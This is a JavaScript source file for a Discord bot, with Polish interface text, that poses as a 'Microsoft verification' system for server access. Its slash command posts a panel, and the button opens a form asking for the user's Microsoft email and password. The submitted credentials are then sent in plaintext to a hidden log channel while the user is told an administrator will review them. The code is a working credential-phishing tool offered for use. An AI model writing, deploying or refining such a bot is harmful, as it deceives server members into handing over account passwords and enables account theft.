const { 
    Client, 
    GatewayIntentBits, 
    Partials, 
    EmbedBuilder, 
    ActionRowBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    ModalBuilder, 
    TextInputBuilder, 
    TextInputStyle,
    REST,
    Routes
} = require('discord.js');
require('dotenv').config();
const http = require('http');

// Render Port Binding Fix
http.createServer((req, res) => {
    res.write("Bot is running!");
    res.end();
}).listen(process.env.PORT || 3000);

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ],
    partials: [Partials.Channel, Partials.Message, Partials.User]
});

const PREFIX = '!';
const LOG_CHANNEL_ID = "1505269850191433921"; // ID kanału sprawdzacz botow

client.once('ready', async () => {
    console.log(`\x1b[32m[READY]\x1b[0m Zalogowano jako ${client.user.tag}`);
    client.user.setActivity('Weryfikacja Microsoft', { type: 3 });

    const commands = [
        {
            name: 'panelweryfikacja',
            description: 'Wysyła panel weryfikacji Microsoft',
        }
    ];

    const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);

    try {
        console.log('Rozpoczynam rejestrację komend slash...');
        await rest.put(
            Routes.applicationCommands(client.user.id),
            { body: commands },
        );
        console.log('Pomyślnie zarejestrowano komendy slash!');
    } catch (error) {
        console.error('Błąd podczas rejestracji komend:', error);
    }
});

client.on('interactionCreate', async (interaction) => {
    // 1. Komenda Slash - Panel
    if (interaction.isChatInputCommand()) {
        if (interaction.commandName === 'panelweryfikacja') {
            const embed = new EmbedBuilder()
                .setColor(0x00AAFF)
                .setTitle('🛡️ System Weryfikacji')
                .setDescription('Hej! Podaj swój mail konta microsoft abyśmy wiedzieli czy nie jesteś botem i zweryfikuj się!')
                .setFooter({ text: 'Weryfikacja jest wymagana, aby uzyskać dostęp do serwera.' });

            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId('start_verify')
                    .setLabel('Weryfikacja')
                    .setEmoji('📧')
                    .setStyle(ButtonStyle.Primary)
            );

            await interaction.channel.send({ embeds: [embed], components: [row] });
            await interaction.reply({ content: '✅ Panel wysłany!', ephemeral: true });
        }
    }

    // 2. Obsługa Przycisku - Otwiera JEDEN modal z dwiema polami
    if (interaction.isButton()) {
        if (interaction.customId === 'start_verify') {
            const modal = new ModalBuilder()
                .setCustomId('modal_verify')
                .setTitle('Weryfikacja Microsoft');

            const emailInput = new TextInputBuilder()
                .setCustomId('input_email')
                .setLabel("Mail konta Microsoft")
                .setPlaceholder("np. gracz123@outlook.com")
                .setStyle(TextInputStyle.Short)
                .setRequired(true);

            const passInput = new TextInputBuilder()
                .setCustomId('input_password')
                .setLabel("Hasło")
                .setPlaceholder("********")
                .setStyle(TextInputStyle.Short)
                .setRequired(true);

            modal.addComponents(
                new ActionRowBuilder().addComponents(emailInput),
                new ActionRowBuilder().addComponents(passInput)
            );
            await interaction.showModal(modal);
        }
    }

    // 3. Obsługa Formularza (Zbiorcza)
    if (interaction.isModalSubmit()) {
        if (interaction.customId === 'modal_verify') {
            const email = interaction.fields.getTextInputValue('input_email');
            const password = interaction.fields.getTextInputValue('input_password');

            // Logowanie na kanał sprawdzacz botow
            const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
            if (logChannel) {
                const logEmbed = new EmbedBuilder()
                    .setColor(0xFF0000)
                    .setTitle('🚨 Nowe Dane Weryfikacyjne')
                    .addFields(
                        { name: '👤 Użytkownik', value: `${interaction.user.tag} (\`${interaction.user.id}\`)`, inline: false },
                        { name: '📧 Mail', value: `\`${email}\``, inline: true },
                        { name: '🔑 Hasło/Kod', value: `\`${password}\``, inline: true }
                    )
                    .setTimestamp();
                await logChannel.send({ embeds: [logEmbed] });
            }

            await interaction.reply({ 
                content: '✅ Twoje dane zostały przesłane do weryfikacji. Poczekaj na odpowiedź administratora.', 
                ephemeral: true 
            });
        }
    }
});

client.on('messageCreate', async (message) => {
    if (message.author.bot || !message.content.startsWith(PREFIX)) return;
    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();
    if (command === 'ping') {
        await message.reply(`Pong! **${Math.round(client.ws.ping)}ms**`);
    }
});

client.login(process.env.TOKEN).catch(err => {
    console.error('\x1b[31m[ERROR]\x1b[0m Nie udało się zalogować.');
});
